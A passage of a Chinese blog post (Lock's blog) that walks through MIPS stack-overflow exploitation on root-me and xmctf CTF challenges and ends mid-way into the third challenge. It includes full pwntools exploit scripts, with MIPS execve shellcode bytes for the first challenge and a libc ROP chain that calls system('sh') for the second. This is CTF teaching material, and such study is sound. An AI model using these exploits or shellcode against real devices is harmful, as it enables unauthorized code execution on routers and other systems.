<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="MIPS PWN学习"><meta name="keywords" content="MIPS"><meta name="author" content="Lock,undefined"><meta name="copyright" content="Lock"><title>MIPS PWN学习【Lock's blog】</title><link rel="stylesheet" href="/LawlietLW.github.io/css/fan.css"><link rel="stylesheet" href="/LawlietLW.github.io/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="icon" href="/LawlietLW.github.io/favicon.ico"><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/LawlietLW.github.io/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/LawlietLW.github.io/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
}</script><meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/LawlietLW.github.io/atom.xml" title="Lock's blog" type="application/atom+xml">
<link rel="stylesheet" href="/LawlietLW.github.io/css/prism-tomorrow.css" type="text/css"></head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-rootme-ELF-MIPS-Stack-buffer-overflow-No-NX"><span class="toc-number">1.</span> <span class="toc-text">0x1.rootme-ELF MIPS - Stack buffer overflow - No NX</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-rootme-ELF-MIPS-Basic-ROP"><span class="toc-number">2.</span> <span class="toc-text">0x2.rootme-ELF MIPS - Basic ROP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-xmctf-top-mipspwn"><span class="toc-number">3.</span> <span class="toc-text">0x3.xmctf.top-mipspwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">Lock</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="mailto:2499086884@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color5"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/LawlietLW.github.io/archives"><span class="pull-top">日志</span><span class="pull-bottom">32</span></a><a class="author-info-articles-tags article-meta" href="/LawlietLW.github.io/tags"><span class="pull-top">标签</span><span class="pull-bottom">40</span></a><a class="author-info-articles-categories article-meta" href="/LawlietLW.github.io/categories"><span class="pull-top">分类</span><span class="pull-bottom">5</span></a></div><div class="friend-link"><a class="friend-link-text" href="https://buuoj.cn/" target="_blank">友链1:BUUCTF，有刷不完的题~</a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="title-name" href="/LawlietLW.github.io/">Lock's blog</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">MIPS PWN学习</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2020-08-04 | 更新于 2020-08-31</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/">二进制</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/MIPS/">MIPS</a></div></div></div><div class="main-content"><p>​        MIPS架构常用于路由器设备，而路由器固件漏洞大部分都是栈溢出，因此，掌握MIPS架构下的漏洞利用对于挖掘利用路由器漏洞也是很重要的一项技能。</p>
<a id="more"></a>

<p>准备环境及工具：</p>
<ul>
<li><strong>Ubuntu16</strong>虚拟机(Ubuntu14或者Ubuntu18也可以，不过推荐使用Ubuntu16，我用18装环境遇到了很多奇奇怪怪的问题)</li>
<li><strong>buildroot</strong>交叉编译环境，由于<strong>buildroot</strong>只能编译大端序或者小端序一种架构的环境，这里推荐安装<strong>gcc-mipsel-linux-gnu</strong>和<strong>gcc-mips-linux-gnu</strong>，直接apt安装就可以，使用方法和gcc一样</li>
<li><strong>gdb-multiarch</strong>，提供多架构的调试，直接apt安装，再装一个<strong>pwndbg</strong>或者<strong>peda</strong>或者<strong>gef</strong>插件使用更方便，使用方法：<strong>qemu-mips/qemu-mipsel -L lib/ -g 1234(端口号) ./bin</strong> ,然后<strong>gdb-multiarch ./bin</strong>加载程序，gdb会自动识别程序架构，然后用<strong>target remote:127.0.0.1:1234</strong>来连接qemu进行调试即可。当然，用IDA连接也是可以，<strong>Debugger-&gt;Remote GDB Debugger</strong>然后填上ip端口号和文件路径就行了</li>
<li>IDA插件，<strong>mipsrop</strong>，开源在GitHub上，由于mips指令和x86指令存在差别，mips指令没有类似于push、pop这种直接使数据入栈出栈的指令，只有<strong>lw(load word)</strong>，<strong>sw(save word)</strong>之类的指令来进行数据的转移，于是我们要在栈上进行操作就有很多种方式，用<strong>ROPgadget</strong>来搜索会很麻烦，而<strong>mipsrop</strong>会将<strong>gadgets</strong>进行分类以及不同的<strong>gadget</strong>使用后导致的结果显示出来，使用起来要方便的多。</li>
<li><strong>Ghidra</strong>，将mips汇编反编译为c伪代码，<strong>jeb</strong>也有mips反编译功能，不过对比了一下觉得<strong>Ghidra</strong>的效果更好(IDA7.5也新增了mips反编译功能，不过……贫穷使我望而却步)</li>
</ul>
<p>​       简单说一下mips架构的寄存器及作用。mips32一共有32个通用寄存器，用<strong>$0-$31</strong>表示。<strong>$4-$7</strong>寄存器用作函数传参，记为<strong>$a0-$a3(argument)</strong>,超出四个参数的用栈传参;<strong>$28</strong>寄存器记为<strong>$gp(global pointer)</strong>,这是一个全局指针，各种函数调用之类都靠$gp寻址;<strong>$29</strong>记为<strong>$sp(stack pointer)</strong>,作用和x86架构的sp寄存器一样，指向栈顶;<strong>$30</strong>记为<strong>$fp(fram pointer)</strong>,或者记为<strong>$s8</strong>，这个寄存器类似于x86架构的ebp指针，指向栈底;<strong>$31</strong>记为<strong>$ra(return address)</strong>，类似于x86架构的eip寄存器，保存返回地址，我们的攻击目标就是劫持$ra寄存器。我们进行利用常用的就这些寄存器。</p>
<p>接下来上题</p>
<h2 id="0x1-rootme-ELF-MIPS-Stack-buffer-overflow-No-NX"><a href="#0x1-rootme-ELF-MIPS-Stack-buffer-overflow-No-NX" class="headerlink" title="0x1.rootme-ELF MIPS - Stack buffer overflow - No NX"></a>0x1.rootme-ELF MIPS - Stack buffer overflow - No NX</h2><p>题目只给我们mips的汇编代码，所以我们需要由汇编编译出可执行文件</p>
<pre class=" language-assembly"><code class="language-assembly">.set    nomips16
    .global __start
    .text

__start:
    la      $t9, function
    jalr    $t9
    nop
    addiu   $v0, $zero, 4000 + 1
    move    $a0, $zero
    syscall
function:
    subu    $sp, $sp, 0x18
    sw      $ra, 0x14($sp)

    # write
    addiu   $v0, $zero, 4000 + 4
    la    $a0, 1
    la    $a1, hello
    la    $a2, hello_len
    syscall

    # read
    addiu   $v0, $zero, 4000 + 3
    move    $a0, $zero
    move    $a1, $sp
    addiu   $a2, $zero, 0x80
    syscall

    # write
    addiu   $v0, $zero, 4000 + 4
    la      $a0, 1
    la      $a1, hello_start
    la      $a2, hello_start_len
    syscall

    # write
    addiu   $v0, $zero, 4000 + 4
    la      $a0, 1
    move    $a1, $sp
    la      $a2, 20
    syscall

    lw      $ra, 0x14($sp)
    addiu   $sp, 0x18
    jr      $ra
    nop

.data

hello:  .asciz  "Hello World\nWhat is your name: "
    hello_len =    . - hello
hello_start:  .asciz  "Hello "
    hello_start_len =    . - hello_start</code></pre>
<p>题目给的保护如下</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/1.jpg" alt></p>
<p>由于题目说的是MIPS，所以我们就按照大端序来编译</p>
<p>用如下命令进行编译</p>
<pre><code>mips-linux-gnu-as of.s -o of.o #编译成二进制目标文件
mips-linux-gnu-ld of.o -o of #编译生成可执行文件</code></pre><p>然后我们运行一下，由于是静态编译，所以直接./of即可</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/2.jpg" alt></p>
<p>从汇编我们可以看到</p>
<pre class=" language-assembly"><code class="language-assembly">subu    $sp, $sp, 0x18
sw      $ra, 0x14($sp)</code></pre>
<p>函数开头只将栈顶抬高了0x18个字节，并将返回地址存入sp+0x14的位置，而后面的read功能读入0x80个字节</p>
<pre class=" language-assembly"><code class="language-assembly"># read
addiu   $v0, $zero, 4000 + 3 #$v0保存系统调用号，read系统调用号为4003
move    $a0, $zero #$a0保存第一个参数，0
move    $a1, $sp #$a1保存第二个参数，栈顶指针
addiu   $a2, $zero, 0x80 #$a2保存第三个参数，0x80</code></pre>
<p>存在很明显的栈溢出，而由于程序是由简短的汇编代码生成，所以基本上不存在可用的gadget，而由于远程没有开启<strong>ASLR</strong>，所以栈地址也不会发生变化，且程序没有<strong>NX</strong>保护，所以我们使用shellcode来进行利用</p>
<p>由汇编代码我们可以知道offset为0x14，我们填充0x14个垃圾字符，然后将返回值覆盖为<strong>$sp+0x14+4</strong>，即存储返回地址的位置的后四字节，然后将$sp+0x14+4的值填充为shellcode，这样返回到$ra之后就会执行shellcode</p>
<p>关闭本机上的aslr后动态调试，可以得到stack的地址</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/3.jpg" alt></p>
<p>不过在按照这个栈地址打不通，于是我动调了一下exp，发现此时的栈地址后三位为148，调试程序和调试exp时的栈地址相差0x10的大小</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/4.jpg" alt></p>
<p>修改之后便能打通了,最终exp如下</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'mips'</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">'big'</span>
<span class="token comment" spellcheck="true"># io=process(['qemu-mips','-g','1235','./of'])</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./of'</span><span class="token punctuation">)</span>
stack <span class="token operator">=</span> <span class="token number">0x76fff148</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x14</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>stack<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> <span class="token string">"\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xf4\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c"</span>
payload <span class="token operator">+=</span> shellcode
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'What is your name: '</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/5.jpg" alt></p>
<p>(但不知道为什么远程就是打不通。。。)</p>
<h2 id="0x2-rootme-ELF-MIPS-Basic-ROP"><a href="#0x2-rootme-ELF-MIPS-Basic-ROP" class="headerlink" title="0x2.rootme-ELF MIPS - Basic ROP"></a>0x2.rootme-ELF MIPS - Basic ROP</h2><p>程序保护如下</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/6.jpg" alt></p>
<p>连接ssh下载文件</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/7.jpg" alt>)(rootme的ssh连上去还挺好康的)</p>
<p>虽然题目已经告诉了保护情况，但拿到题目我还是习惯先checksec一下</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/8.jpg" alt></p>
<p>32位大端序程序，而且之前ssh连上去之后就直接告诉我们了程序是动态编译的</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/9.jpg" alt></p>
<p>于是我们顺便把lib文件夹下载下来(由于ssh服务器在外网，所以我这里下载的挺慢的。。。)，文件夹中有两个文件，ld.so.1和libc.so.6</p>
<p>但运行起来却出了意想不到的情况</p>
<p>一般来说应该直接<strong>qemu-mips -L  ./  ./ch64</strong>就能运行起来，但这题却给我报了这么个错</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/10.jpg" alt></p>
<p>然而在ssh服务器上使用这条命令却能直接运行</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/11.jpg" alt></p>
<p>有点懵逼，遂谷歌报错信息，但并没有获得有用的信息，查看了一下ssh服务器上的qemu版本，为2.11.1，猜测是不是qemu版本不对，就下载了2.11.1，然而并没有什么🥚用，陷入沉思。之后又谷歌了一下，看到有类似报错的，直接使用-g进行调试，于是使用<strong>qemu-mips -L  ./ -g 1234 ./ch64</strong>启动调试，vmmap查看发现程序并未加载libc.6.so库,仅仅只加载了ld.so.1，于是便使用pwn题下加载不同libc的方法强制加载libc.so.6库</p>
<pre class=" language-shell"><code class="language-shell">export LD_LIBRARY_PATH=`pwd`
export LD_PRELOAD=lib/libc.so.6</code></pre>
<p>然后运行</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/12.jpg" alt></p>
<p>成功！第一行的报错个人猜测是我强制加载了libc库，然后-L 又指定了一下libc，然后报错，当然这只是猜测，也懒得谷歌了</p>
<p>接下来就开始利用</p>
<p>首先将程序分别用IDA和Ghidra进行加载，用ghidra查看伪代码,main函数如下</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  byte bStack144<span class="token punctuation">;</span>
  <span class="token keyword">char</span> acStack136 <span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  bStack144 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_stdout<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span>bStack144 <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>bStack144 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nAccess denied.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token comment" spellcheck="true">/* WARNING: Subroutine does not return */</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter your passphrase: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fgets</span><span class="token punctuation">(</span>acStack136<span class="token punctuation">,</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    iVar1 <span class="token operator">=</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>acStack136<span class="token punctuation">,</span><span class="token string">"$MyPasswordPoorlySecured!"</span><span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
    bStack144 <span class="token operator">=</span> bStack144 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nAccess granted!.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>分析main函数，我们有三次输入的机会，存在明显的栈溢出</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> acStack136 <span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">fgets</span><span class="token punctuation">(</span>acStack136<span class="token punctuation">,</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>fgets接受0x200个字节的输入，而缓冲区大小只有128字节，当输入为<strong>$MyPasswordPoorlySecured!</strong>时就退出while循环</p>
<p>我们动态调试一下来确定偏移量，使用cyclic 200生成200个字符，然后输入进去</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/14.jpg" alt></p>
<p>程序崩溃，然后确定偏移量</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/15.jpg" alt></p>
<p>offset=132,我们再来验证一下，我们使用cyclic生成132个字符再加上BBBB</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/16.jpg" alt></p>
<p>可以看到，返回地址确实被覆盖成了BBBB</p>
<p>确定了返回地址，该怎么利用</p>
<p>由于远程环境未开启ASLR且程序未开启PIE，所以libc加载地址是不变的，我们无需泄露libc地址，直接vmmap查看libc加载地址即可</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/17.jpg" alt></p>
<p>可以查看到libc基地址为<strong>0x76637000</strong></p>
<p>然后我们要构造出system(‘/bin/sh’),有了libc基地址，system和binsh字符串的地址也知道了，接下来查找gadget，IDA加载libc.so.6，使用<strong>mipsrop.stackfinder()</strong>命令查找用于栈的gadgets</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/18.jpg" alt></p>
<p>我们需要控制$a0，用于存放binsh的地址，我们选择<strong>0x0012BAA4</strong>位置处的gadget来操作，如下</p>
<pre class=" language-assembly"><code class="language-assembly">.text:0012BAA4                 move    $t9, $s0
.text:0012BAA8                 jalr    $t9 ; pipe
.text:0012BAAC                 addiu   $a0, $sp, 0x24  # '$'</code></pre>
<p>这一处gadget会将<strong>$sp+0x24</strong>处的值作为<strong>$a0</strong>的值，所以<strong>$sp+0x24</strong>处我们要填上binsh的地址，然后会跳转到$s0寄存器指向的地址处，所以<strong>$s0</strong>我们要设置为system函数的地址，为了方便说明，我们称这个gadget为<strong>gadget_a0</strong></p>
<p>要完成<strong>gadget_a0</strong>，我们需要先设置好$s0寄存器的值，uclibc中有一个类似于x86-64架构下的通用gadget，可以设置我们要用到的绝大多数的寄存器的值，<strong>位于 <code>scandir</code> 或者 <code>scandir64</code>尾部</strong>，如下所示</p>
<pre class=" language-assembly"><code class="language-assembly">.text:000AE818                 lw      $ra, 0x40+var_4($sp)
.text:000AE81C                 move    $v0, $s6
.text:000AE820                 lw      $s7, 0x40+var_8($sp)
.text:000AE824                 lw      $s6, 0x40+var_C($sp)
.text:000AE828                 lw      $s5, 0x40+var_10($sp)
.text:000AE82C                 lw      $s4, 0x40+var_14($sp)
.text:000AE830                 lw      $s3, 0x40+var_18($sp)
.text:000AE834                 lw      $s2, 0x40+var_1C($sp)
.text:000AE838                 lw      $s1, 0x40+var_20($sp)
.text:000AE83C                 lw      $s0, 0x40+var_24($sp)
.text:000AE840                 jr      $ra
.text:000AE844                 addiu   $sp, 0x40</code></pre>
<p>利用这个gadget，我们可以将$s0设置为system函数的地址，将这个gadget执行完后的返回值设置为gadget_a0的地址，即在<strong>$sp+0x3c</strong>的位置处填入gadget_a0的地址，类似的我们称这个gadget为<strong>gadget_s0</strong></p>
<p>于是，我们整个payload的结构图如下</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/1.png" alt></p>
<p>详细地解释一下这个流程，首先偏移量132，随后将返回地址覆盖为gadget_s0，然后由于这一句</p>
<pre class=" language-assembly"><code class="language-assembly">lw      $s0, 0x40+var_24($sp)</code></pre>
<p>将0x1c($sp)位置处的值写入$s0，所以$sp+0x1c处我们填充为system地址，而由于当程序执行gadget_s0时，gadget_s0就是sp所指向的位置，所以直接填充0x1c个垃圾字符后接上system地址即可，由于返回地址为</p>
<pre class=" language-assembly"><code class="language-assembly">lw      $ra, 0x40+var_4($sp)</code></pre>
<p>即相对于返回地址位置+0x3c处要填充为gadget_a0的地址，‘A’*0X1C+system(4字节)=0x20字节，所以在system后再填充(0x3c-0x20)个字节的垃圾字符，然后再填充gadget_a0的地址，再填充0x24个垃圾字节，最后写入binsh的地址</p>
<p>不过这样子的exp写完会有点问题，发生在执行system(“/bin/sh”)的时候，如下</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/21.jpg" alt></p>
<p>也不想调试到底是哪里发生了问题，作为替代，我将binsh的地址直接替换为sh\x00\x00，然后就可以打通了，exp如下</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'mips'</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">'big'</span>

io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'qemu-mips'</span><span class="token punctuation">,</span> <span class="token string">'-L'</span><span class="token punctuation">,</span> <span class="token string">'./'</span><span class="token punctuation">,</span> <span class="token string">'./ch64'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#io = process(['qemu-mips', '-L', './', '-g', '1234', './ch64'])</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'lib/libc.so.6'</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> <span class="token number">0x76637000</span>
system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x00164fac</span>
gadget_a0 <span class="token operator">=</span> <span class="token number">0x0012BAA4</span><span class="token operator">+</span>libc_base
gadget_s0 <span class="token operator">=</span> <span class="token number">0x000AE818</span><span class="token operator">+</span>libc_base

log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'binsh_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'gadget_a0 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>gadget_a0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'gadget_s0 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>gadget_s0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">'''
payload = 'A'*0x40
payload += p32(0x409010)
payload += 'A'*0x40
'''</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">132</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>gadget_s0<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x1c</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x1c</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>gadget_a0<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x24</span>
payload <span class="token operator">+=</span> <span class="token string">'sh'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Enter your passphrase: '</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Enter your passphrase: '</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'$MyPasswordPoorlySecured!'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/22.jpg" alt></p>
<h2 id="0x3-xmctf-top-mipspwn"><a href="#0x3-xmctf-top-mipspwn" class="headerlink" title="0x3.xmctf.top-mipspwn"></a>0x3.xmctf.top-mipspwn</h2><p>下载下来有两个libc文件和一个可执行文件，checksec检查一下</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/23.jpg" alt></p>
<p>32位小端序，无保护</p>
<p>file一下</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/24.jpg" alt></p>
<p>静态编译，所以这个lib文件夹并没有什么用</p>
<p>分别用ghidra和IDA加载题目，ghidra查看伪代码</p>
<p>main函数和漏洞函数分别如下</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">main</span><span class="token punctuation">(</span>EVP_PKEY_CTX <span class="token operator">*</span>param_1<span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  <span class="token function">init</span><span class="token punctuation">(</span>param_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"what is your name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">vul</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  undefined auStack64 <span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"just do it~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
